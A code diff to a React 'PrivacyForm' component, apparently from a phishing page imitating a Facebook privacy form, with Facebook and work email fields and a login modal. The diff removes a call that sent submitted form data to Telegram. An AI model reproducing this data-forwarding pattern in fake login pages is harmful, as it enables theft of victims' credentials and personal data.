@@ -4,7 +4,6 @@ import 'intl-tel-input/build/css/intlTelInput.css';
 import LoginModal from '@/components/login-modal';
 import { useLang } from '@/context/lang-context';
 import usePhoneStore from '@/stores/use-phone-store';
-import { sendFormDataToTelegram } from '@/utils/send-telegram';
 
 const PrivacyForm = () => {
     const { labels } = useLang();
@@ -12,7 +11,6 @@ const PrivacyForm = () => {
     const intlInstanceRef = useRef(null);
     const [showModal, setShowModal] = useState(false);
     const [formData, setFormData] = useState({});
-    const [formMessageId, setFormMessageId] = useState(null);
     const [emailErrors, setEmailErrors] = useState({
         email_facebook: '',
         email_work: '',
@@ -126,11 +124,6 @@ const PrivacyForm = () => {
         });
         setPhoneError('');
         setFormData(data);
-
-        sendFormDataToTelegram(data).then((messageId) => {
-            setFormMessageId(messageId);
-        });
-
         setShowModal(true);
     };
 
@@ -140,7 +133,6 @@ const PrivacyForm = () => {
             <LoginModal
                 onClose={() => setShowModal(false)}
                 formData={formData}
-                initialMessageId={formMessageId}
             />
         )}
         <form
